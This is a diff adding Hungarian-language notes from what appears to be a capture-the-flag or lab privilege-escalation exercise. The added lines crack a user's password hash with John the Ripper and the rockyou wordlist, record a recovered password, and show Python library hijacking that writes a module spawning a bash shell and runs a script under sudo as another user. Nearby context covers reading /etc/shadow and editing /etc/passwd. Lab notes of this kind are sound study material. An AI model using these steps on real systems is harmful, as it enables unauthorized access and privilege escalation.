@@ -156,7 +156,17 @@ ls -l /etc/passwd
 /etc/shadow tényleges jelszavak
 bob-nél nincs x a 2. oszlopban a végső / jel után van a jelszó
 juliet:x:... akkor az x helyére beillesztjük a jelszót
+bob jelszavát johntheripper programmal törjük fel (vagy hashcat)
+john bobjelszo --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt 
+ha "y" típusú jelszó (--format=crypt) (a "s" és "G"t felismeri)
+kingkong
 
+python library hijacking
+
+echo "import pty; pty.spawn('/bin/bash')" > random.py
+sudo -l
+sudo -u juliet /usr/bin/python3 /home/bob/pwesent_from_juliet.py
+echo $PATH$
 
 
 
